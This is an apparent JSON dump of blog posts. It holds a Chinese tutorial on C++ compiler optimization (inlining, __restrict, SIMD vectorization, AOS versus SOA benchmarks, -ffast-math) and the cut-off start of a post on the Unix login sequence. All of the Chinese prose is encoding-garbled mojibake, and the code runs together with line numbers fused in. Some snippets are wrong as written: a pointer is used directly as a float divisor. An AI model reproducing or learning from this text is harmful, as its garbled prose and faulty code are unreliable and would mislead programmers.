å¦‚æœå‡½æ•°çš„å®ç°å’Œå£°æ˜åˆ†ç¦»ï¼Œåœ¨è°ƒç”¨æ—¶ï¼Œè¢«ç§°ä¸ºè°ƒç”¨å¤–éƒ¨å‡½æ•°ã€‚è°ƒç”¨æ—¶ï¼Œé“¾æ¥å™¨ä¼šé€šè¿‡ PLT å‡½æ•°é“¾æ¥è¡¨ï¼Œåœ¨å…¶ä»– .o æ–‡ä»¶ä¸­æŸ¥æ‰¾å‡½æ•°çš„å®šä¹‰ã€‚ å¦‚æœå‡½æ•°å®ç°å°±åœ¨è°ƒç”¨çš„åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œç§°ä¸ºå†…éƒ¨å‡½æ•°ã€‚æ­¤æ—¶ä¼šç›´æ¥è°ƒç”¨ï¼Œè€Œä¸æ˜¯é€šè¿‡é“¾æ¥å™¨ï¼Œå‡è½»äº†é“¾æ¥å™¨çš„è´Ÿæ‹…ã€‚ åªæœ‰å®šä¹‰åœ¨åŒä¸€ä¸ªæ–‡ä»¶çš„å‡½æ•°å¯ä»¥è¢«å†…è”ã€‚ ä¸ºäº†æ•ˆç‡æˆ‘ä»¬å¯ä»¥å°½é‡æŠŠå¸¸ç”¨å‡½æ•°å®šä¹‰åœ¨å¤´æ–‡ä»¶é‡Œï¼Œç„¶åå£°æ˜ä¸º staticã€‚è¿™æ ·è°ƒç”¨ä»–ä»¬çš„æ—¶å€™ç¼–è¯‘å™¨çœ‹å¾—åˆ°ä»–ä»¬çš„å‡½æ•°ä½“ï¼Œä»è€Œæœ‰æœºä¼šå†…è”ã€‚ å½“ç¼–è¯‘å™¨çœ‹å¾—åˆ°è¢«è°ƒç”¨å‡½æ•°å®ç°çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠŠå‡½æ•°å®ç°è´´åˆ°è°ƒç”¨ä»–çš„å‡½æ•°é‡Œï¼Œå®ç°å‡½æ•°å†…è”ã€‚ inline å…³é”®å­— åœ¨ç°ä»£ç¼–è¯‘å™¨çš„é«˜å¼ºåº¦ä¼˜åŒ–ä¸‹ï¼ŒåŠ ä¸åŠ  inline æ— æ‰€è°“ã€‚åªè¦ä»–çœ‹å¾—è§ other çš„å‡½æ•°ä½“å®šä¹‰ï¼Œå°±ä¼šè‡ªåŠ¨å†…è”ã€‚ å†…è”ä¸å¦å’Œ inline æ²¡å…³ç³»ï¼Œå†…è”ä¸å¦åªå–å†³äºæ˜¯å¦åœ¨åŒæ–‡ä»¶ï¼Œä¸”å‡½æ•°ä½“å¤Ÿå°ã€‚ æƒ³è¦æ€§èƒ½ï¼Œå®šä¹‰åœ¨å¤´æ–‡ä»¶å£°æ˜ä¸º static å³å¯ï¼Œæ²¡å¿…è¦åŠ  inline çš„ã€‚static çº¯ç²¹æ˜¯ä¸ºäº†é¿å…å¤šä¸ª .cpp å¼•ç”¨åŒä¸€ä¸ªå¤´æ–‡ä»¶é€ æˆå†²çªï¼Œå¹¶ä¸æ˜¯å†…è”å¿…éœ€çš„ã€‚ å¯ä»¥å®éªŒæµ‹è¯•ï¼Œåœ¨çº¿åšç¼–è¯‘å™¨å®éªŒï¼šhttps://godbolt.org/ã€‚ æŒ‡é’ˆä¼˜åŒ– 1234void func(int *a, int *b, int *c) &#123; *c = *a; *c = *b;&#125; ä¸ºä»€ä¹ˆç¼–è¯‘å™¨ä¸ä¼˜åŒ–æ‰ c = aï¼Ÿ å› ä¸º b å’Œ c å¯èƒ½æŒ‡å‘åŒä¸€ä¸ªå˜é‡ã€‚ ä¼˜åŒ–å‰ç›¸å½“äºï¼šb = a; b = b; æœ€å b å˜æˆäº† aã€‚ å¦‚æœä¼˜åŒ–äº†ï¼šb = b; æœ€å b æ²¡æœ‰æ”¹å˜ã€‚ è¿™ç§æƒ…å†µå«åš pointer aliasingã€‚ __restrict __restrict æ˜¯ä¸€ä¸ªæç¤ºæ€§çš„å…³é”®å­—ï¼Œæ˜¯ç¨‹åºå‘˜å‘ç¼–è¯‘å™¨ä¿è¯ï¼šè¿™äº›æŒ‡é’ˆä¹‹é—´ä¸ä¼šå‘ç”Ÿé‡å  ï¼ˆpointer aliasingï¼‰ï¼Œä»è€Œå¯ä»¥æ”¾å¿ƒåœ°ä¼˜åŒ–ã€‚ å®é™…ä¸Šï¼Œ__restrict åªéœ€è¦åŠ åœ¨æ‰€æœ‰å…·æœ‰å†™å…¥è®¿é—®çš„æŒ‡é’ˆä¸Šï¼Œå°±å¯ä»¥ä¼˜åŒ–æˆåŠŸã€‚å³åªéœ€åŠ åœ¨é const å‚æ•°ä¹‹å‰å³å¯ã€‚ å› ä¸ºåªè¯»çš„å˜é‡ï¼Œéšä¾¿å‡ ä¸ªæŒ‡é’ˆæŒ‡å‘å®ƒæ— æ‰€è°“ã€‚ volatile åŠ äº† volatile çš„å¯¹è±¡ï¼Œç¼–è¯‘å™¨ä¼šæ”¾å¼ƒä¼˜åŒ–å¯¹ä»–çš„è¯»å†™æ“ä½œã€‚åšæ€§èƒ½å®éªŒçš„æ—¶å€™éå¸¸æœ‰ç”¨ã€‚ volatile åœ¨ * å‰é¢è€Œï¼Œ__restrict åœ¨ * åé¢ã€‚ volatile æ˜¯ç¦ç”¨ä¼˜åŒ–ï¼Œ__restrict æ˜¯å¸®åŠ©ä¼˜åŒ–ã€‚ restrict æ˜¯ C99 æ ‡å‡†å…³é”®å­—ï¼Œä½†ä¸æ˜¯ C++ æ ‡å‡†çš„å…³é”®å­—ã€‚__restrict å…¶å®æ˜¯ç¼–è¯‘å™¨çš„â€œç§è´§â€ï¼Œä¸åœ¨C++æ ‡å‡†ä¸­ï¼Œå¥½åœ¨å¤§å¤šæ•°ä¸»æµç¼–è¯‘å™¨éƒ½æ”¯æŒã€‚ çŸ¢é‡åŒ– åˆå¹¶å†™å…¥ ç¼–è¯‘å™¨å¯ä»¥å°†ä¸¤ä¸ª int32 çš„å†™å…¥åˆå¹¶ä¸ºä¸€ä¸ª int64 çš„å†™å…¥ã€‚ä½†å¦‚æœè®¿é—®çš„ä¸¤ä¸ªå…ƒç´ åœ°å€é—´æœ‰è·³è·ƒï¼Œå°±ä¸èƒ½åˆå¹¶äº†ã€‚ ä¸ç®¡æ˜¯ç¼–è¯‘å™¨è¿˜æ˜¯ CPUï¼Œéƒ½å–œæ¬¢é¡ºåºçš„è¿ç»­è®¿é—®ã€‚ ä¸¤ä¸ª int32 å¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ª int64ã€‚å››ä¸ª int32 å¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ª __m128ã€‚ å…«ä¸ª int32 å¯ä»¥åˆå¹¶ä¸ºä¸€ä¸ª __m256ã€‚ xmm0 ç”± SSE å¼•å…¥ï¼Œæ˜¯ä¸ª 128 ä½å¯„å­˜å™¨ã€‚ä»–å¯ä»¥ä¸€æ¬¡å­˜å‚¨ 4 ä¸ª intï¼Œæˆ– 4 ä¸ª floatã€‚ å¦‚æœç¡¬ä»¶æ”¯æŒAVXæŒ‡ä»¤é›†ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ 256 ä½çš„ ymm0 å¯„å­˜å™¨ã€‚gcc -march=native è®©ç¼–è¯‘å™¨è‡ªåŠ¨åˆ¤æ–­å½“å‰ç¡¬ä»¶æ”¯æŒçš„æŒ‡ä»¤ã€‚ ç¼–è¯‘å™¨ä¼šä½¿ç”¨ SIMD æŒ‡ä»¤è¿›è¡Œä¼˜åŒ–ã€‚ æ•°ç»„æ¸…é›¶ ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åˆ†æä½ æ˜¯åœ¨åšæ‹·è´æˆ–æ˜¯æ¸…é›¶ï¼Œå¹¶ä¼˜åŒ–æˆå¯¹æ ‡å‡†åº“è¿™ä¿©çš„è°ƒç”¨ã€‚ æ•°ç»„å¾ªç¯èµ‹å€¼ 12345void func(int *a, int n) &#123; for (int i = 0; i &lt; n; ++i) &#123; a[i] = i; &#125;&#125; n å¦‚æœæ˜¯ 4 çš„å€æ•°ï¼Œä½¿ç”¨SIMDæŒ‡ä»¤ä¸€æ¬¡å†™å…¥ 4 ä¸ª intã€‚ å¦‚æœ n ä¸æ˜¯ 4 çš„å€æ•°ï¼Œå°†èƒ½è¢«4æ•´é™¤çš„éƒ¨åˆ†ä½¿ç”¨SIMDï¼Œå‰©ä½™è¾¹ç•Œéƒ¨åˆ†ï¼Œæ¯æ¬¡å¤„ç† 1 ä¸ªã€‚ å¦‚æœèƒ½ä¿è¯æŒ‡é’ˆ a æ€»æ˜¯å¯¹é½åˆ° 16 å­—èŠ‚ï¼Œåœ¨ GCC ç¼–è¯‘å™¨ä¸­è¿™æ ·å†™ï¼š 1234567void func(int *a, int n) &#123; n = n / 4 * 4; a = (int*)__builtin_assume_aligned(a, 16); for (int i = 0; i &lt; n; ++i) &#123; a[i] = i; &#125;&#125; C++20 å¼•å…¥äº†æ ‡å‡†åŒ–çš„ std::assume_aligned 1234567void func(int *a, int n) &#123; n = n / 4 * 4; a = std::assume_aligned&lt;16&gt;(a); for (int i = 0; i &lt; n; ++i) &#123; a[i] = i; &#125;&#125; æ•°ç»„é‡å  åœ¨è¿è¡Œæ—¶æ£€æµ‹ a, b æŒ‡é’ˆçš„å·®æ˜¯å¦è¶…è¿‡ 1024 æ¥åˆ¤æ–­æ˜¯å¦æœ‰é‡å ç°è±¡ã€‚ å¦‚æœæ²¡æœ‰é‡å ï¼Œåˆ™è·³è½¬åˆ° SIMD ç‰ˆæœ¬é«˜æ•ˆè¿è¡Œã€‚ å¦‚æœé‡å ï¼Œåˆ™è·³è½¬åˆ°æ ‡é‡ç‰ˆæœ¬ä½æ•ˆè¿è¡Œï¼Œä½†è‡³å°‘ä¸ä¼šé”™ã€‚ ç¼–è¯‘å™¨ç¼–è¯‘ä¸¤ä¸ªç‰ˆæœ¬çš„ä»£ç ï¼Œpsç»“å°¾æŒ‡ä»¤ä¸ºçŸ¢é‡åŒ–æŒ‡ä»¤ï¼Œssç»“å°¾æŒ‡ä»¤ä¸ºæ ‡é‡åŒ–æŒ‡ä»¤ï¼š __restrict å…³é”®å­—å¯ä»¥åŠ ä»¥ä¼˜åŒ–ï¼š åªéœ€è¦ç”Ÿæˆä¸€ä¸ª SIMD ç‰ˆæœ¬äº†ï¼Œæ²¡æœ‰äº†è¿è¡Œæ—¶åˆ¤æ–­é‡å çš„ç„¦è™‘ã€‚ æˆ–è€…ï¼Œä½¿ç”¨ OpenMP : æ¥è¿«ä½¿ç¼–è¯‘å™¨æ— è§†æŒ‡é’ˆåˆ«åçš„é—®é¢˜ï¼Œå¹¶å¯ç”¨ SIMD ä¼˜åŒ–ã€‚ç¼–è¯‘å‚æ•°è®¾ç½®ä¸º gcc -fopenmpã€‚ gcc ä¹Ÿæä¾›äº†ç›¸ä¼¼çš„ç¼–è¯‘æŒ‡ä»¤ï¼š å¾ªç¯ä¸­çš„if æœ‰ if åˆ†æ”¯çš„å¾ªç¯ä½“æ˜¯éš¾ä»¥ SIMD çŸ¢é‡åŒ–çš„ã€‚ åœ¨ç¼–è¯‘å™¨çœ‹æ¥ï¼Œis_mul æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œäºæ˜¯æŠŠ if åˆ†æ”¯åˆ¤æ–­æŒªåˆ°äº† for å¤–é¢æ¥ã€‚ è¿™æ ·å°±å¯ä»¥ä½¿ç”¨ SIMD æŒ‡ä»¤ã€‚è¿™ä¸€ä¼˜åŒ–è¿‡ç¨‹ï¼Œç¼–è¯‘å™¨å¯ä»¥è‡ªåŠ¨è¿›è¡Œã€‚ å¾ªç¯ä¸­çš„ä¸å˜é‡ dt * dt å’Œå½“å‰ i æ— å…³ï¼Œå› æ­¤å¯ä»¥ç§»åˆ°å¾ªç¯ä½“å¤–ï¼Œæå‰è®¡ç®—ï¼Œé¿å…é‡å¤è®¡ç®—ã€‚ åœ¨ä½¿ç”¨äº† ï¼ˆdt * dtï¼‰æ¡ä»¶ä¸‹ï¼Œç¼–è¯‘å™¨å¯ä»¥è‡ªåŠ¨ä¼˜åŒ–ï¼Œä½†æ˜¯åªè¦å»æ‰ (dt * dt) çš„æ‹¬å·å°±ä¼šä¼˜åŒ–å¤±è´¥ã€‚å› ä¸ºä¹˜æ³•æ˜¯å·¦ç»“åˆçš„ï¼Œå°±ç›¸å½“äº (b[i] * dt) * dt ç¼–è¯‘å™¨è¯†åˆ«ä¸åˆ°ä¸å˜é‡ï¼Œä»è€Œä¼˜åŒ–å¤±è´¥ã€‚ è¦ä¹ˆå¸®ç¼–è¯‘å™¨æ‰“ä¸Šæ‹¬å·å¸®åŠ©ä»–è¯†åˆ«ï¼Œè¦ä¹ˆæ‰‹åŠ¨æå–ä¸å˜é‡åˆ°å¾ªç¯ä½“å¤–ã€‚ å¾ªç¯ä¸­çš„å¤–éƒ¨å‡½æ•° é¿å…åœ¨ for å¾ªç¯ä½“é‡Œè°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼ŒæŠŠä»–ä»¬ç§»åˆ°åŒä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œæˆ–è€…æ”¾åœ¨å¤´æ–‡ä»¶å£°æ˜ä¸º static å‡½æ•°ã€‚è¿™æ ·ç¼–è¯‘å™¨èƒ½çœ‹åˆ°è°ƒç”¨å‡½æ•°çš„å‡½æ•°ä½“ï¼Œæ‰èƒ½è¿›è¡Œå†…è”ä¼˜åŒ–ã€‚ å¾ªç¯å±•å¼€ æ¯æ¬¡æ‰§è¡Œå¾ªç¯ä½“ a[i] = 1åï¼Œéƒ½è¦è¿›è¡Œä¸€æ¬¡åˆ¤æ–­ i &lt; 1024ã€‚å¯¼è‡´ä¸€éƒ¨åˆ†æ—¶é—´èŠ±åœ¨åˆ¤æ–­æ˜¯å¦ç»“æŸå¾ªç¯ï¼Œè€Œä¸æ˜¯å¾ªç¯ä½“é‡Œã€‚ å¯¹äº GCC ç¼–è¯‘å™¨ï¼Œå¯ä»¥ç”¨ #pragma GCC unroll 4 è¡¨ç¤ºæŠŠå¾ªç¯ä½“å±•å¼€ä¸º4ä¸ªï¼Œç›¸å½“äºï¼š ä½†æ˜¯ä¸å»ºè®®æ‰‹åŠ¨è¿™æ ·å†™ï¼Œä¼šå¦¨ç¢ç¼–è¯‘å™¨çš„ SIMD çŸ¢é‡åŒ–ã€‚ å¯¹å°çš„å¾ªç¯ä½“è¿›è¡Œ unroll å¯èƒ½æ˜¯åˆ’ç®—çš„ï¼Œä½†æœ€å¥½ä¸è¦ unroll å¤§çš„å¾ªç¯ä½“ï¼Œå¦åˆ™ä¼šé€ æˆæŒ‡ä»¤ç¼“å­˜çš„å‹åŠ›åè€Œå˜æ…¢ï¼ åµŒå¥—å¾ªç¯ ç¼–è¯‘å™¨æ‹…å¿ƒ c å’Œ a å¯èƒ½ä¼šæŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œè€Œè¿ç»­åˆ¤æ–­ä¸‰ä¸ªæŒ‡é’ˆæ˜¯å¦æœ‰é‡åˆåˆè¿‡äºå¤æ‚ï¼Œæ”¾å¼ƒäº†çŸ¢é‡åŒ–ã€‚ è§£å†³æ–¹æ¡ˆ1ï¼šå…ˆè¯»åˆ°å±€éƒ¨å˜é‡ï¼Œç´¯åŠ å®Œæ¯•åï¼Œå†å†™å…¥ ç¼–è¯‘å™¨è®¤ä¸ºä¸å­˜åœ¨æŒ‡é’ˆåˆ«åçš„é—®é¢˜ï¼ŒçŸ¢é‡åŒ–æˆåŠŸã€‚ è§£å†³æ–¹æ¡ˆ2ï¼šå…ˆç´¯åŠ åˆ°åˆå§‹ä¸º 0 çš„å±€éƒ¨å˜é‡ï¼Œå†ç´¯åŠ åˆ° c è¯¥è§£å†³æ–¹æ¡ˆæ¯”èµ·å‰ä¸€ç§ï¼Œç”±äºåŠ æ³•é¡ºåºåŸå› ï¼Œç®—å‡ºæ¥çš„æµ®ç‚¹ç²¾åº¦æ›´é«˜ï¼Œc[i] åé¢å¯èƒ½å¾ˆå¤§äº†ã€‚ ç»“æ„ä½“ ç»“æ„ä½“å¯¹é½ä¼šå½±å“åˆ°çŸ¢é‡åŒ–ã€‚ ä¸¤ä¸ª float çš„ç»“æ„ä½“ï¼Œå¯¹é½åˆ° 8 å­—èŠ‚ï¼Œå¯ä»¥æˆåŠŸ SIMD çŸ¢é‡åŒ–ã€‚ ä¸‰ä¸ª float çš„ç»“æ„ä½“ï¼Œå¯¹é½åˆ° 12 å­—èŠ‚ï¼ŒçŸ¢é‡åŒ–å¤±è´¥ã€‚ è¿½åŠ äº†ä¸€ä¸ªæ²¡æœ‰ç”¨çš„ 4 å­—èŠ‚å˜é‡ï¼Œæ•´ä¸ªç»“æ„ä½“å˜æˆ 16 å­—èŠ‚å¤§å°ã€‚ çŸ¢é‡åŒ–åè€ŒæˆåŠŸã€‚ è®¡ç®—æœºå–œæ¬¢ 2 çš„æ•´æ•°å¹‚ï¼Œ2, 4, 8, 16, 32, 64, 128...ã€‚ç»“æ„ä½“å¤§å°è‹¥ä¸æ˜¯ 2 çš„æ•´æ•°å¹‚ï¼Œå¾€å¾€ä¼šå¯¼è‡´ SIMD ä¼˜åŒ–å¤±è´¥ã€‚ alignas C++11 çš„æ–°è¯­æ³•ã€‚åœ¨ struct ååŠ ä¸Š alignas(è¦å¯¹é½åˆ°çš„å­—èŠ‚æ•°) å³å¯å®ç°åŒæ ·æ•ˆæœï¼Œå°±ä¸éœ€è¦æ‰‹åŠ¨å†™ padding å˜é‡äº†ã€‚ ä½†æ˜¯è¿™ç§paddingç­–ç•¥ï¼Œä¹Ÿæœ‰å¯èƒ½ä¸ä»…ä¸å˜å¿«ï¼Œåè€Œè¿˜å˜æ…¢ã€‚SIMD å’Œç¼“å­˜è¡Œå¯¹é½åªæ˜¯æ€§èƒ½ä¼˜åŒ–çš„ä¸€ä¸ªç‚¹ï¼Œåˆä¸æ˜¯å…¨éƒ¨ã€‚è¿˜è¦è€ƒè™‘ç»“æ„ä½“å˜å¤§ä¼šå¯¼è‡´å†…å­˜å¸¦å®½çš„å ç”¨ï¼Œå¯¹ç¼“å­˜çš„å ç”¨ç­‰ä¸€ç³»åˆ—è¿é”ååº”ï¼Œæ€»ä¹‹ï¼Œè¦æ ¹æ®å®é™…æƒ…å†µé€‰æ‹©ä¼˜åŒ–æ–¹æ¡ˆã€‚ AOS ä¸ SOA AOSï¼ˆArray of Structï¼‰å•ä¸ªå¯¹è±¡çš„å±æ€§ç´§æŒ¨ç€å­˜ã€‚SOAï¼ˆStruct of Arrayï¼‰å±æ€§åˆ†ç¦»å­˜å‚¨åœ¨å¤šä¸ªæ•°ç»„ã€‚ AOS å¿…é¡»å¯¹é½åˆ° 2 çš„å¹‚æ‰é«˜æ•ˆï¼ŒSOA å°±ä¸éœ€è¦ã€‚SOA ä¸ç¬¦åˆç›´è§‰ï¼Œä½†é€šå¸¸æ˜¯æ›´é«˜æ•ˆçš„ã€‚ SOAï¼šåˆ†ç¦»å­˜å‚¨å¤šä¸ªå±æ€§ã€‚ä¸ç¬¦åˆé¢å‘å¯¹è±¡ç¼–ç¨‹ (OOP) çš„ä¹ æƒ¯ï¼Œä½†å¸¸å¸¸æœ‰åˆ©äºæ€§èƒ½ã€‚åˆç§°ä¹‹ä¸ºé¢å‘æ•°æ®ç¼–ç¨‹ (DOP)ã€‚ æˆåŠŸ SIMD çŸ¢é‡åŒ–ã€‚ AOSOA 4 ä¸ªå¯¹è±¡ä¸€ç»„æ‰“åŒ…æˆ SOAï¼Œå†ç”¨ä¸€ä¸ª n / 4 å¤§å°çš„æ•°ç»„å­˜å‚¨ä¸º AOSã€‚ ä¼˜ç‚¹ï¼šSOA ä¾¿äº SIMD ä¼˜åŒ–ï¼›AOS ä¾¿äºå­˜å‚¨åœ¨ä¼ ç»Ÿå®¹å™¨ï¼›AOSOA ä¸¤è€…å¾—å…¼ã€‚ ç¼ºç‚¹ï¼šéœ€è¦ä¸¤å±‚ for å¾ªç¯ï¼Œä¸åˆ©äºéšæœºè®¿é—®ï¼›éœ€è¦æ•°ç»„å¤§å°æ˜¯ 4 çš„æ•´æ•°å€ï¼Œä¸è¿‡å¯ä»¥ç”¨è¾¹ç•Œç‰¹åˆ¤æ³•ï¼ˆå•ç‹¬å¤„ç†ä¸èƒ½çŸ¢é‡åŒ–éƒ¨åˆ†ï¼‰è§£å†³ã€‚ Benchmark aos 12345678910111213struct Point &#123; float x; float y; float z;&#125;;Point ps[N];void compute() &#123; for (int i = 0; i &lt; N; i++) &#123; ps[i].x = ps[i].x + ps[i].y + ps[i].z; &#125;&#125; aos_aligned 12345678910struct Point &#123; float x; float y; float z; char padding[4];&#125;;Point ps[N];// åŒcompute aos_parallel 1234567891011121314struct Point &#123; float x; float y; float z;&#125;;Point ps[N];void compute() &#123;#pragma omp parallel for for (int i = 0; i &lt; N; i++) &#123; ps[i].x = ps[i].x + ps[i].y + ps[i].z; &#125;&#125; aosoa 123456789101112131415struct Point &#123; float x[M]; float y[M]; float z[M];&#125;;Point ps[N / M];void compute() &#123; for (int i = 0; i &lt; N / M; i++) &#123; for (int j = 0; j &lt; M; j++) &#123; ps[i].x[j] = ps[i].x[j] + ps[i].y[j] + ps[i].z[j]; &#125; &#125;&#125; soa 12345678910111213struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123; for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_size_t 12345678910111213struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123; for (std::size_t i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_simd 1234567891011121314struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123;#pragma omp simd for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_unroll 123456789101112131415161718struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123;#if defined(__GNUC__) || defined(__clang__)#pragma GCC unroll 32#elif defined(_MSC_VER)#pragma unroll 32#endif for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_parallel 1234567891011121314struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123;#pragma omp parallel for for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; æµ‹è¯• 12345678910111213#include &lt;iostream&gt;#include &lt;chrono&gt;template &lt;class Name, class Func&gt;static inline void profile(int times, Name const &amp;name, Func const &amp;func) &#123; auto t0 = std::chrono::steady_clock::now(); for (int i = 0; i &lt; times; i++) &#123; func(); &#125; auto t1 = std::chrono::steady_clock::now(); long dt = std::chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(t1 - t0).count() / times; std::cout &lt;&lt; name &lt;&lt; \": \" &lt;&lt; dt &lt;&lt; std::endl;&#125; ç»“æœ å•çº¿ç¨‹çš„ SOA + unroll ç”šè‡³ç•¥å¾®è¶…è¿‡äº†å¹¶è¡Œç‰ˆçš„ AOSã€‚OpenMP å¹¶éä¸‡èƒ½ï¼Œå•çº¿ç¨‹çš„ç¨‹åºè®¤çœŸä¼˜åŒ–åä¸€æ ·æ‰“è´¥æ— è„‘å¹¶è¡Œã€‚ æ€§èƒ½è¿˜å’Œarrayå¤§å° N æœ‰å…³ã€‚ std::vector ä½¿ç”¨ pragma omp simd æˆ– pragma GCC ivdep å¯ä»¥è§£å†³ vector çš„ pointer aliasing é—®é¢˜ã€‚ å¦å¤–ï¼Œä½¿ç”¨ std::vector ä¹Ÿå¯ä»¥å®ç° SOAï¼Œä¸è¿‡ï¼Œè¯·ä¿è¯ vector æ˜¯åŒæ ·å¤§å°ã€‚ C++æ•°å­¦è¿ç®—ä¼˜åŒ– é™¤æ³•å˜ä¹˜æ³• 123float func(float a) &#123; return a / 2;&#125; æ±‡ç¼–å˜ä¸ºmulä¹˜æ³•ï¼Œ* 0.5fã€‚ ä½†æ˜¯ä»¥ä¸‹ç¨‹åºå´æ²¡æœ‰ä¼˜åŒ–ï¼š 12345void func(float *a, float *b) &#123; for (int i = 0; i &lt; 1024; i++) &#123; a[i] /= b; &#125;&#125; å› ä¸ºç¼–è¯‘å™¨å®³æ€• b = 0ã€‚ ä¹˜æ³•æ¯”é™¤æ³•æ›´å¿«ï¼Œæ‰€ä»¥å¯ä»¥æå‰è®¡ç®—å¥½ b çš„å€’æ•°é¿å…é‡å¤æ±‚é™¤æ³•ã€‚ 123456void func(float *a, float *b) &#123; float inv_b = 1 / b; for (int i = 0; i &lt; 1024; i++) &#123; a[i] *= inv_b; &#125;&#125; -ffast-math -ffast-math é€‰é¡¹è®© GCC æ›´å¤§èƒ†åœ°å°è¯•æµ®ç‚¹è¿ç®—çš„ä¼˜åŒ–ï¼Œæœ‰æ—¶èƒ½å¸¦æ¥ 2 å€å·¦å³çš„æå‡ã€‚ä½œä¸ºä»£ä»·ï¼Œä»–å¯¹ NaN å’Œæ— ç©·å¤§çš„å¤„ç†ã€‚ å¦‚æœä½ èƒ½ä¿è¯ï¼Œç¨‹åºä¸­æ°¸è¿œä¸ä¼šå‡ºç° NaN å’Œæ— ç©·å¤§ï¼Œé‚£ä¹ˆå¯ä»¥æ”¾å¿ƒæ‰“å¼€ -ffast-mathã€‚ æ•°å­¦å‡½æ•°è¯·åŠ  std:: å‰ç¼€ sqrt åªæ¥å— double sqrtf åªæ¥å— float std::sqrt é‡è½½äº† double å’Œ floatï¼ˆæ¨èï¼‰ abs åªæ¥å— int fabs åªæ¥å— double fabsf åªæ¥å— float std::abs é‡è½½äº† int, double, floatï¼ˆæ¨èï¼‰ è¯·å‹¿ç”¨å…¨å±€çš„æ•°å­¦å‡½æ•°ï¼Œä»–ä»¬æ˜¯ C è¯­è¨€çš„é—äº§ã€‚å§‹ç»ˆç”¨ std::sin, std::pow ç­‰ã€‚ å°ç»“ å‡½æ•°å°½é‡å†™åœ¨åŒä¸€ä¸ªæ–‡ä»¶å†… é¿å…åœ¨ for å¾ªç¯å†…è°ƒç”¨å¤–éƒ¨å‡½æ•° é const æŒ‡é’ˆåŠ ä¸Š __restrict ä¿®é¥° è¯•ç€ç”¨ SOA å–ä»£ AOS å¯¹é½åˆ° 16 æˆ– 64 å­—èŠ‚ ç®€å•çš„ä»£ç ï¼Œä¸è¦å¤æ‚åŒ– è¯•è¯•çœ‹ #pragma omp simd å¾ªç¯ä¸­ä¸å˜çš„å¸¸é‡æŒªåˆ°å¤–é¢æ¥ å¯¹å°å¾ªç¯ä½“ç”¨ #pragma unroll -ffast-math å’Œ -march=native","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Compiler","slug":"Compiler","permalink":"https://racleray.github.io/tags/Compiler/"}],"author":"HeRui"},{"title":"Unixç”¨æˆ·ç»ˆç«¯ç™»å½•è¿‡ç¨‹åˆ†æ","slug":"Unixç”¨æˆ·ç»ˆç«¯ç™»å½•è¿‡ç¨‹åˆ†æ","date":"2023-04-24T13:01:35.000Z","updated":"2024-01-11T02:08:51.535Z","comments":true,"path":"posts/ff5b020d.html","link":"","permalink":"https://racleray.github.io/posts/ff5b020d.html","excerpt":"Unixç”¨æˆ·ç»ˆç«¯ç™»å½•è¿‡ç¨‹åˆ†æ","text":"login ä¹‹å‰ UNIXç³»ç»Ÿä¸­ï¼Œç”¨æˆ·åœ¨ç»ˆç«¯ç™»å½•è¿‡ç¨‹å¤§è‡´ä¸ºï¼ˆLinuxç³»ç»Ÿä¸ä¹‹å·®å¼‚ä¸å¤§ï¼Œä¸»è¦æ˜¯æ˜¯é…ç½®æ–‡ä»¶ç»„ç»‡å½¢å¼æœ‰å·®å¼‚ï¼‰ï¼š ç³»ç»Ÿè‡ªä¸¾ï¼ˆç³»ç»Ÿå¯åŠ¨åˆå§‹åŒ–ï¼‰æ—¶ï¼Œå†…æ ¸åˆ›å»ºè¿›ç¨‹ 1 å·è¿›ç¨‹initï¼Œinit è¿›å…¥å¤šç”¨æˆ·æ¨¡å¼ï¼Œè¯»å– /etc/tty å¯¹æ¯ä¸€ä¸ªå…è®¸ç™»å½•çš„ç»ˆç«¯è®¾å¤‡ï¼Œinit ä¾æ¬¡è°ƒç”¨ forkï¼Œå­è¿›ç¨‹ exec getty getty å¯¹ç»ˆç«¯è®¾å¤‡è°ƒç”¨ open å‡½æ•°ï¼Œä»¥è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œä¹Ÿå¯èƒ½åœ¨æŸä¸€ç­‰å¾…è¿æ¥çº¿è·¯çš„è®¾å¤‡å¤„ç­‰å¾… æ–‡ä»¶æè¿°ç¬¦ 0 1 2 è¢«è®¾ç½®æŒ‡å‘è¯¥è®¾å¤‡ è¾“å‡º login: å­—ç¬¦ä¸²ç­‰å¾…ç”¨æˆ·è¾“å…¥ è¾“å…¥æˆåŠŸåï¼ŒæŒ‰ç…§ä»¥ä¸‹æ–¹å¼è°ƒç”¨loginç¨‹åº 1execle(\"/bin/login\", \"login\", \"-p\", username, (char *)0, envp); getty ä»¥ç»ˆç«¯åç§°å’Œåœ¨ gettytab ä¸­è¯´æ˜çš„ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²ï¼Œä¸º login åˆ›å»ºä¸€ä¸ªç¯å¢ƒå‚æ•° envpã€‚-p 